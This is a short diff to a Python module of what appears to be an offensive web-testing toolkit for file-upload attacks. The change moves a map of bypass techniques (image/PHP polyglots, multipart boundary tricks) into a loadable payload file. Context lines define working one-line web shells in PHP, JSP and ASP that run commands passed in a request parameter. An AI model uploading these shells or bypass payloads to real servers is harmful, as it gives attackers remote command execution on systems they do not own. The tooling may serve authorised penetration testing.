@@ -19,7 +19,7 @@ Fluxo:
 """
 import argparseimport loggingfrom collections.abc import Awaitable, Callablefrom dataclasses import asdict, dataclassfrom urllib.parse import urljoinimport httpxfrom mytools.core.utils import (    Cyber,    add_common_args,    color,    create_async_client,    create_banner,    fetch,    print_exploit_info,    run_main_loop,    safe_asyncio_run,    write_output,)logger = logging.getLogger("mytools.fileupload")
 
-_CATEGORY_MAP: dict[str, list[str]] = {
+_CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
     "polyglot": [
         "jpg_php", "png_php", "gif_php", "pdf_php", "svg_php", "html_polyglot",
     ],
@@ -44,9 +44,21 @@ _CATEGORY_MAP: dict[str, list[str]] = {
     "multipart_boundary": [
         "boundary_inject", "nested_multipart", "missing_boundary",
         "extra_boundary", "boundary_overflow", "chunked_boundary",
-    ],
-}
-
+    ],
+
+}
+
+def _load_category_map() -> dict[str, list[str]]:
+
+    from mytools.data import load_payloads
+
+    data = load_payloads("web", "fileupload", default={"category_map": _CATEGORY_MAP_DEFAULT})
+
+    return data.get("category_map", _CATEGORY_MAP_DEFAULT)
+
+
+
+_CATEGORY_MAP = _load_category_map()
 _PHP_SHELL = b"<?php system($_GET['c']); ?>"
 _JSP_SHELL = b'<% Runtime.getRuntime().exec(request.getParameter("c")); %>'
 _ASP_SHELL = b'<% eval(Request("c")) %>'
